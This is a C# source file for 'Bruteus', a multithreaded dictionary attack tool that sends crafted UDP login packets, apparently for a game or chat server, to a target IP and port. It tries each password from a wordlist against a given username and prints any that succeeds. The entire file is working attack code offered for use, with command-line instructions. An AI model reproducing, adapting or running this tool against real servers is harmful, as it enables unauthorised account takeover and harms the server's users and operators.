using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Threading;

namespace Bruteus
{
    class Bruteus
    {
        static String nick = "Bruteus";
        static int id;
        static string host;
        static int port;
        static int timeout;
        static byte[] packet;
        static byte[] filler = new byte[]{
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00
        };
        static string[] passwords;
        static int curr;
        static int stop;
        static bool finished;

        public static void Main(string[] args)
        {
            id = Process.GetCurrentProcess().Id;
            Console.Title = "Bruteus by JaGx";
            if (args.Length < 6)
            {
                Console.WriteLine("Parameters: bruteus.exe ip port pwfile number_of_threads receive_timeout user");
                Console.WriteLine("Ex: bruteus.exe 133.337.133.37 8767 dictionary.txt 50 1000 JaGx");
                Console.Read();
                return;
            }
            int num_user_parts = args.Length - 5;
            string[] user_parts = new string[num_user_parts];
            Array.ConstrainedCopy(args, 5, user_parts, 0, num_user_parts);
            string user = String.Join(" ", user_parts);
            curr = 0;
            host = args[0];
            port = Int32.Parse(args[1]);
            timeout = Int32.Parse(args[4]);
            packet = new byte[180];
            MemoryStream stream = new MemoryStream(packet);
            BinaryWriter writer = new BinaryWriter(stream);
            writer.Write(new byte[]{
             0xF4, 0xBE, 0x03
            });
            stream.Seek(80, SeekOrigin.Begin);
            writer.Write((ulong)0x3C00020000002000);
            stream.WriteByte(0x01);
            stream.WriteByte(0x02);
            stream.WriteByte((byte)user.Length);
            writer.Write(user.ToCharArray());
            stream.Seek(150, SeekOrigin.Begin);
            stream.WriteByte((byte)nick.Length);
            writer.Write(nick.ToCharArray());
            TextReader text_reader = File.OpenText(args[2]);
            ArrayList passwords = new ArrayList();
            string pw;
            while ((pw = text_reader.ReadLine()) != null)
            {
                if (pw.Length > 3 && pw.Length < 30)
                {
                    passwords.Add(pw);
                }
            }
            Bruteus.passwords = (string[])passwords.ToArray(typeof(string));
            stop = Bruteus.passwords.Length;
            Console.WriteLine("Bruteus Initialized");
            Console.WriteLine("-------------------------");
            Console.WriteLine("IP Address: " + host);
            Console.WriteLine("Port: " + port);
            Console.WriteLine("Username: " + user);
            Console.WriteLine("Password File: " + args[2]);
            Console.WriteLine("# of passwords: " + Bruteus.passwords.Length);
            Console.WriteLine();
            int num_threads = Int32.Parse(args[3]);
            for (int i = 0; i < num_threads; i++)
            {
                new Thread(new ThreadStart(threadedAttempt)).Start();
            }
            new Thread(new ThreadStart(updateStatus)).Start();
        }

        static void updateStatus()
        {
            int last_index = curr;
            int curr_index;
            for (; ; )
            {
                Thread.Sleep(1000);
                if (curr >= stop || finished)
                {
                    break;
                }
                curr_index = curr;
                Console.Write(curr_index);
                Console.Write("/");
                Console.Write(passwords.Length);
                Console.Write(" - ");
                Console.Write(curr_index * 100 / stop);
                Console.Write("% - ");
                Console.Write(curr_index - last_index);
                Console.Write(" b/s - ");
                Console.WriteLine(passwords[curr_index]);
                last_index = curr_index;
            }
            finished = true;
        }

        static void threadedAttempt()
        {
            String pw;
            byte[] packet = (byte[])Bruteus.packet.Clone();
            MemoryStream stream = new MemoryStream(packet);
            BinaryWriter writer = new BinaryWriter(stream);
            byte[] response = new byte[436];
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket.Connect(host, port);
            socket.ReceiveTimeout = timeout;
            for (; ; )
            {
                if (curr >= stop || finished)
                {
                    break;
                }
                pw = passwords[curr++];
                stream.Seek(120, SeekOrigin.Begin);
                stream.WriteByte((byte)pw.Length);
                stream.Seek(121, SeekOrigin.Begin);
                writer.Write(pw.ToCharArray());
                stream.Write(filler, pw.Length, 29 - pw.Length);
                stream.Seek(16, SeekOrigin.Begin);
                writer.Write((uint)0x00000000);
                stream.Seek(16, SeekOrigin.Begin);
                writer.Write(Crc.get(packet));
            send:
                socket.Send(packet);
                try
                {
                    socket.Receive(response);
                }
                catch
                {
                    socket = new Socket(socket.DuplicateAndClose(id));
                    goto send;
                }
                if (response[20] != 0x00)
                {
                    Console.WriteLine("...............................");
                    Console.WriteLine("Password found!");
                    Console.WriteLine(pw);
                    Console.WriteLine();
                    break;
                }
            }
            if (!finished)
            {
                finished = true;
                Console.WriteLine("...............................");
                Console.Write("Finished!");
                Console.Beep();
                Console.Read();
            }
            socket.Close();
        }
    }
}
